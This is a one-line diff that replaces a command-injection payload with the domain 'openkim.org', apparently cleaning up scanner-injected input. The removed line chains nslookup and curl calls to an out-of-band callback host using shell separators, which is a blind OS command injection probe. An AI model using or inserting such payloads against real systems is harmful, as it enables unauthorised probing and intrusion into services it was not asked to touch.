@@ -1,1 +1,1 @@
-;(nslookup -q=cname hithmnppevotl7756c.bxss.me||curl hithmnppevotl7756c.bxss.me)|(nslookup -q=cname hithmnppevotl7756c.bxss.me||curl hithmnppevotl7756c.bxss.me)&(nslookup -q=cname hithmnppevotl7756c.bxss.me||curl hithmnppevotl7756c.bxss.me)
+openkim.org
